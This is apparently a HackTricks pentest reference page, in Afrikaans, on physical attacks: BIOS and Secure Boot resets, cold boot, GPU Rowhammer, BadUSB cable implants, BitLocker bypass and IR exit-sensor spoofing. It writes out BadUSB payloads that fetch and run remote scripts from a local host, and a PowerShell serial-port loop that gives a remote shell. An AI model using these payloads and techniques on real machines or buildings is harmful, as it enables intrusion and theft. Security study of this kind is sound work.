# Fisiese Aanvalle

{{#include ../banners/hacktricks-training.md}}

## BIOS-wagwoordherwinning en Stelselsekuriteit

**Die BIOS terugstel** kan op verskeie maniere gedoen word. Die meeste moederborde bevat ’n **battery** wat, wanneer dit vir ongeveer **30 minute** verwyder word, die BIOS-instellings, insluitend die wagwoord, sal terugstel. Alternatiewelik kan ’n **jumper op die moederbord** aangepas word om hierdie instellings terug te stel deur spesifieke penne te verbind.

Vir situasies waar hardeware-aanpassings nie moontlik of prakties is nie, bied **sagtewaretools** ’n oplossing. Deur ’n stelsel vanaf ’n **Live CD/USB** met distributions soos **Kali Linux** te laat loop, kry jy toegang tot tools soos **_killCmos_** en **_CmosPWD_**, wat met BIOS-wagwoordherwinning kan help.

In gevalle waar die BIOS-wagwoord onbekend is, sal die verkeerde invoer daarvan **drie keer** gewoonlik ’n foutkode tot gevolg hê. Hierdie kode kan op webwerwe soos [https://bios-pw.org](https://bios-pw.org) gebruik word om moontlik ’n bruikbare wagwoord te verkry.

### UEFI-sekuriteit

Vir moderne stelsels wat **UEFI** in plaas van tradisionele BIOS gebruik, kan die tool **chipsec** aangewend word om UEFI-instellings te ontleed en te wysig, insluitend die deaktivering van **Secure Boot**. Dit kan met die volgende command gedoen word:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## RAM-ontleding en Cold Boot Attacks

RAM behou data kortliks nadat krag afgeskakel is, gewoonlik vir **1 tot 2 minute**. Hierdie volharding kan tot **10 minute** verleng word deur koue stowwe, soos vloeibare stikstof, toe te dien. Gedurende hierdie verlengde periode kan ’n **memory dump** met tools soos **dd.exe** en **volatility** geskep word vir ontleding.

---

## GPU Rowhammer Against Page Tables

Moderne GPU Rowhammer-aanvalle word baie nuttiger wanneer hulle **GPU virtual-memory metadata** teiken in plaas van gewone buffers. Onlangse werk op **GDDR6 NVIDIA Ampere GPUs** wys dat ’n aanvaller wat ongemagtigde CUDA-code uitvoer, GPU-spesifieke hammering-patrone kan bou, **memory massaging** kan gebruik om paging structures in kwesbare rye te plaas, en dan bisse in die **last-level page table** of ’n intermediêre **page directory** kan omkeer. Sodra ’n enkele translation entry beskadig is, kan die aanvaller **arbitrary GPU memory read/write** verkry en daarna na host compromise oorskakel.<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. **Profile hammerable rows** in GDDR6 en bou refresh-aware / non-uniform hammering-patrone wat in-DRAM-mitigations omseil.
2. **Massage GPU allocations** sodat die driver page-translation structures in hammerable fisiese liggings plaas, eerder as om hulle in die verstek-beskermde pool te hou. In die praktyk kan dit beteken dat die low-memory page-table region uitgeput word en dat groot sparse UVM mappings met beheerde strides gespray word.
3. **Flip translation metadata** soos **PFN** of aperture-related bits binne ’n page-table / page-directory entry sodat die aanvaller-beheerde virtuele bladsy na page-table pages, arbitrêre GPU-geheue of host-visible system mappings resolve.
4. Hergebruik die vervalste mapping om addisionele translation entries te herskryf en eskaleer na **arbitrary GPU memory read/write** oor GPU-contexts.

### Host Pivot and Mitigations

- Met **IOMMU disabled** kan vervalste system-aperture mappings arbitrêre **host physical memory** aan die GPU blootstel, wat die GPU-primitive in volledige host compromise verander.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** teiken last-level page-table entries, terwyl **GeForge** wys dat die beskadiging van ’n page-directory-vlak makliker kan wees omdat een bit flip ’n groter translation subtree kan herteiken. Moenie slegs een paging layer as security-critical beskou nie.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** is steeds belangrik omdat dit die direkte arbitrary-host-memory path blokkeer wat deur GDDRHammer/GeForge gebruik word, maar dit is **nie ’n volledige mitigation nie**. **GPUBreach** wys ’n second-stage pivot waar die aanvaller GPU-writable, driver-owned CPU buffers beskadig en daarna NVIDIA driver memory-safety bugs aktiveer om ’n kernel write primitive en ’n **root shell** te verkry, selfs wanneer IOMMU enabled is.<sup>[[3]](#references)</sup>
- **System-level ECC** is ’n praktiese hardening-stap op ondersteunde workstation/server GPUs. Consumer GPUs sonder ECC stel ’n swakker defense surface bloot.<sup>[[4]](#references)</sup>
- Hierdie aanvalle is nie bloot teoreties nie: **GeForge** het **1,171** bit flips op ’n RTX 3060 en **202** op ’n RTX A6000 gerapporteer, wat genoeg was om ’n werkende host-privilege-escalation chain te bou.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA) Attacks

**INCEPTION** is ’n tool wat ontwerp is vir **physical memory manipulation** deur DMA, versoenbaar met interfaces soos **FireWire** en **Thunderbolt**. Dit maak dit moontlik om login-prosedures te omseil deur geheue te patch sodat enige wagwoord aanvaar word. Dit is egter ondoeltreffend teen **Windows 10**-stelsels.

---

## Live CD/USB for System Access

Deur stelselbinaries soos **_sethc.exe_** of **_Utilman.exe_** met ’n kopie van **_cmd.exe_** te vervang, kan ’n command prompt met system privileges verskaf word. Tools soos **chntpw** kan gebruik word om die **SAM**-lêer van ’n Windows-installation te wysig, wat wagwoordveranderings moontlik maak.

**Kon-Boot** is ’n tool wat dit moontlik maak om by Windows-stelsels aan te meld sonder om die wagwoord te ken, deur die Windows-kernel of UEFI tydelik te wysig. Meer inligting is beskikbaar by [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).<sup>[[10]](#references)</sup>

---

## Handling Windows Security Features

### Boot and Recovery Shortcuts

- **Supr**: Kry toegang tot BIOS-settings.
- **F8**: Gaan na Recovery mode.
- Deur **Shift** ná die Windows-banner te druk, kan autologon omseil word.

### BAD USB Devices

Devices soos **Rubber Ducky** en **Teensyduino** dien as platforms vir die skep van **bad USB**-devices wat voorafbepaalde payloads kan uitvoer wanneer hulle aan ’n teikenrekenaar gekoppel word.

### Volume Shadow Copy

Administrator privileges laat die skepping van kopieë van sensitiewe lêers, insluitend die **SAM**-lêer, deur PowerShell toe.

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- ESP32-S3-gebaseerde implants soos **Evil Crow Cable Wind** versteek binne USB-A→USB-C- of USB-C↔USB-C-kabels, enumerate uitsluitlik as ’n USB-keyboard, en stel hul C2-stack oor Wi-Fi bloot. Die operator hoef slegs die kabel vanaf die victim-host van krag te voorsien, ’n hotspot met die naam `Evil Crow Cable Wind` en wagwoord `123456789` te skep, en na [http://cable-wind.local/](http://cable-wind.local/) (of sy DHCP-adres) te browse om toegang tot die ingebedde HTTP-interface te verkry.<sup>[[8]](#references)</sup>
- Die browser-UI verskaf tabs vir *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* en *Config*. Gestoor payloads word volgens OS gemerk, keyboard-layouts word on the fly gewissel, en VID/PID-strings kan verander word om bekende peripherals na te boots.
- Omdat die C2 binne die kabel woon, kan ’n foon payloads stage, execution trigger en Wi-Fi-credentials bestuur sonder om aan die host-OS te raak—ideaal vir physical intrusions met ’n kort dwell time.

### OS-aware AutoExec payloads

- AutoExec-reëls bind een of meer payloads om onmiddellik ná USB-enumeration uit te voer. Die implant doen liggewig OS-fingerprinting en kies die ooreenstemmende script.
- Example workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) of `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Omdat execution unattended is, kan die eenvoudige omruiling van ’n charging cable “plug-and-pwn” initial access onder die logged-on user context bewerkstellig.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** ’n Gestoor payload open ’n console en plak ’n loop wat enigiets uitvoer wat op die nuwe USB-serial device aankom. ’n Minimale Windows-variant is:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Die implant hou die USB CDC-kanaal oop terwyl sy ESP32-S3 'n TCP client (Python script, Android APK of desktop executable) terug na die operator begin. Enige grepe wat in die TCP-sessie getik word, word na die serial-lus hierbo aangestuur, wat remote command execution selfs op air-gapped hosts moontlik maak. Uitset is beperk, dus voer operators gewoonlik blind commands uit (rekening-skepping, die staging van addisionele tooling, ens.).

### HTTP OTA update surface

- Dieselfde web stack stel gewoonlik unauthenticated firmware-opdaterings bloot. Evil Crow Cable Wind luister op `/update` en flash enige binary wat opgelaai word:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Veldoperateurs kan features mid-engagement hot-swap (bv. die flash van USB Army Knife-firmware) sonder om die kabel oop te maak, sodat die implant na nuwe vermoëns kan oorskakel terwyl dit steeds by die teikenhost ingeprop is.

## Om BitLocker-enkripsie te omseil

BitLocker-enkripsie kan moontlik omseil word indien die **recovery password** binne ’n memory dump-lêer (**MEMORY.DMP**) gevind word. Tools soos **Elcomsoft Forensic Disk Decryptor** of **Passware Kit Forensic** kan hiervoor gebruik word.

---

## Social Engineering vir die byvoeging van ’n recovery key

’n Nuwe BitLocker recovery key kan deur middel van Social Engineering-taktieke bygevoeg word deur ’n gebruiker te oortuig om ’n command uit te voer wat ’n nuwe recovery key bestaande uit nulle byvoeg, en sodoende die decryption-proses vereenvoudig.

---

## Die uitbuiting van Chassis Intrusion / Maintenance Switches om die BIOS na fabrieksinstellings terug te stel

Baie moderne laptops en desktops met ’n klein vormfaktor bevat ’n **chassis-intrusion switch** wat deur die Embedded Controller (EC) en die BIOS/UEFI-firmware gemonitor word. Hoewel die primêre doel van die switch is om ’n alert te genereer wanneer ’n toestel oopgemaak word, implementeer vendors soms ’n **ongedokumenteerde recovery shortcut** wat geaktiveer word wanneer die switch volgens ’n spesifieke patroon getoggle word.<sup>[[5]](#references)[[6]](#references)</sup>

### Hoe die aanval werk

1. Die switch is aan ’n **GPIO interrupt** op die EC gekoppel.
2. Firmware wat op die EC loop, hou rekord van die **tydsberekening en aantal drukke**.
3. Wanneer ’n hard-coded patroon herken word, roep die EC ’n *mainboard-reset*-roetine aan wat **die inhoud van die stelsel se NVRAM/CMOS uitwis**.
4. Met die volgende boot laai die BIOS verstekwaardes – **supervisor password, Secure Boot-sleutels en alle pasgemaakte konfigurasie word uitgevee**.

> Sodra Secure Boot gedeaktiveer is en die firmware-wagwoord verwyder is, kan die aanvaller eenvoudig enige eksterne OS-image boot en onbeperkte toegang tot die interne drives verkry.

### Werklike voorbeeld – Framework 13 Laptop

Die recovery shortcut vir die Framework 13 (11de/12de/13de generasie) is:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Ná die tiende siklus stel die EC ’n vlag wat die BIOS instrueer om NVRAM tydens die volgende herlaai uit te vee. Die hele prosedure neem ~40 s en vereis **niks buiten ’n skroewedraaier nie**.<sup>[[5]](#references)</sup>

### Generiese Exploitation-prosedure

1. Skakel die teiken aan of voer ’n suspend-resume uit sodat die EC loop.
2. Verwyder die onderste deksel om die intrusion/maintenance-skakelaar bloot te lê.
3. Herhaal die verskafferspesifieke skakelpatroon (raadpleeg dokumentasie, forums, of reverse-engineer die EC-firmware).
4. Sit die toestel weer aanmekaar en herlaai – firmware-beskermings behoort gedeaktiveer te wees.
5. Boot ’n live USB (bv. Kali Linux) en voer gewone post-exploitation uit (credential dumping, data-exfiltrasie, implanting van kwaadwillige EFI-binaries, ens.).

### Detection & Mitigation

* Log chassis-intrusion-gebeurtenisse in die OS-bestuurskonsole en korreleer dit met onverwagte BIOS-resets.
* Gebruik **tamper-evident seals** op skroewe/deksels om opening op te spoor.
* Hou toestelle in **fisies beheerde areas**; aanvaar dat fisiese toegang gelykstaande is aan volledige kompromittering.
* Waar beskikbaar, deaktiveer die verskaffer se “maintenance switch reset”-funksie of vereis addisionele kriptografiese magtiging vir NVRAM-resets.

---

## Covert IR Injection Teen No-Touch Exit Sensors

### Sensor Characteristics
- Kommoditeit-“wave-to-exit”-sensors koppel ’n near-IR LED-emitter met ’n TV-afstandbeheeragtige ontvangermodule wat slegs logic high rapporteer nadat dit verskeie pulse (~4–10) van die korrekte draer (≈30 kHz) waargeneem het.<sup>[[7]](#references)</sup>
- ’n Plastiekomhulsel keer dat die emitter en ontvanger direk na mekaar kyk, sodat die kontroleerder aanvaar dat enige gevalideerde draer van ’n nabygeleë refleksie afkomstig is en ’n relay aandryf wat die deur se strike oopmaak.
- Sodra die kontroleerder glo dat ’n teiken teenwoordig is, verander dit dikwels die uitgaande modulasie-envelop, maar die ontvanger bly enige burst aanvaar wat by die gefiltreerde draer pas.

### Attack Workflow
1. **Capture the emission profile** – koppel ’n logic analyser oor die kontroleerder-penne om beide die pre-detection- en post-detection-golfvorme op te neem wat die interne IR LED aandryf.
2. **Replay only the “post-detection” waveform** – verwyder/ignoreer die standaard-emitter en dryf ’n eksterne IR LED met die reeds-geaktiveerde patroon vanaf die begin. Omdat die ontvanger slegs omgee vir pulse-telling/-frekwensie, behandel dit die gespoofte draer as ’n egte refleksie en aktiveer dit die relay-lyn.
3. **Gate the transmission** – stuur die draer in ingestelde bursts uit (bv. tientalle millisekondes aan, soortgelyke tyd af) om die minimum pulse-telling te lewer sonder om die ontvanger se AGC of interference-handling-logika te versadig. Deurlopende uitsending desensitiseer die sensor vinnig en keer dat die relay aktiveer.

### Long-Range Reflective Injection
- Deur die bench-LED met ’n hoëkrag-IR-diode, MOSFET-driver en fokusoptika te vervang, kan betroubare triggering vanaf ~6 m moontlik gemaak word.
- Die aanvaller benodig nie line-of-sight na die ontvangeropening nie; deur die bundel op binnemure, rakke of deurkosyne te rig wat deur glas sigbaar is, kan gereflekteerde energie die ~30°-field of view binnedring en ’n nabyafstand-handbeweging naboots.
- Omdat die ontvangers slegs swak refleksies verwag, kan ’n veel sterker eksterne bundel van verskeie oppervlaktes afkaats en steeds bo die detection threshold bly.

### Weaponised Attack Torch
- Deur die driver binne ’n kommersiële flitslig in te bou, word die tool in plain sight versteek. Vervang die sigbare LED met ’n hoëkrag-IR LED wat by die ontvanger se band pas, voeg ’n ATtiny412 (of soortgelyk) by om die ≈30 kHz-bursts te genereer, en gebruik ’n MOSFET om die LED-stroom te sink.
- ’n Teleskopiese zoomlens vernou die bundel vir range/precision, terwyl ’n vibrasiemotor onder MCU-beheer haptiese bevestiging gee dat modulasie aktief is sonder om sigbare lig uit te straal.
- Deur verskeie gestoorde modulasiepatrone (effens verskillende draerfrekwensies en envelopes) te deurloop, verhoog dit versoenbaarheid oor herhandelde sensorfamilies heen, sodat die operateur reflektiewe oppervlaktes kan afsoek totdat die relay hoorbaar klik en die deur oopgaan.

---

## References

- [1] [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [raymond.cc - Login To Windows Administrator And Linux Root Account Without Knowing Or Changing Current Password](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password)

{{#include ../banners/hacktricks-training.md}}
